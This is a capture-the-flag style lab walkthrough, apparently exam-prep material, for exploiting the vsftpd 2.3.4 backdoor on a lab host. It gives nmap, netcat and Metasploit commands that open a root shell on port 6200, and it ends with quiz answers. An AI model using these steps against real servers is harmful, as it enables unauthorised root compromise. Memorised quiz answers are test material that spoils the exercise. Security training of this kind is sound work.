# Scenario 17 — vsftpd 2.3.4 smiley backdoor to root flag

**Difficulty:** 🟢 | **Time:** ~15 min | **Domains:** 02, 06, 13
**Tools:** [nmap](../../tools/nmap.md), [metasploit](../../tools/metasploit.md)

## Story
You're given target 10.10.10.17. Identify the FTP service, exploit any known backdoor, and recover `/root/flag.txt`.

## Step 1 — Version scan port 21
**What we're doing:** Get the exact banner — vsftpd 2.3.4 has a famous backdoor.
```bash
nmap -sV -p 21 10.10.10.17
```
**Expected finding:** `21/tcp open  ftp  vsftpd 2.3.4`.
**→ Tool ref:** [nmap -sV](../../tools/nmap.md#scan-techniques)

## Step 2 — Manual trigger (learn the mechanic)
**What we're doing:** The backdoor opens port 6200 when a username ending with `:)` is sent.
```bash
nc 10.10.10.17 21
USER backdoor:)
PASS any
# (connection hangs — in another terminal)
nc 10.10.10.17 6200
id
```
**Expected finding:** `uid=0(root)` shell on port 6200.

## Step 3 — Or use Metasploit
**What we're doing:** Reliable exploit module.
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.17
run
```
**Expected finding:** Root shell session.
**→ Tool ref:** [metasploit exploit flow](../../tools/metasploit.md#exploit-flow)

## Step 4 — Read the flag
```bash
cat /root/flag.txt
```

## Step 5 — Final answer
**Answer format:** the flag string verbatim (e.g. `CEH{smiley_backdoor}`).

## Gotchas across this chain
- The backdoor only triggers if the version is exactly `vsftpd 2.3.4` from the compromised 2011 tarball — patched distros have the same version but no backdoor.
- Port 6200 is firewalled on some boxes; confirm with `nmap -p 6200` before giving up.
- If port 6200 doesn't open, try again — race conditions in the exploit are common.

## Variant questions this scenario teaches
- "What version of vsftpd is running?"
- "What CVE is associated?" → CVE-2011-2523
- "What port does the backdoor bind?" → 6200

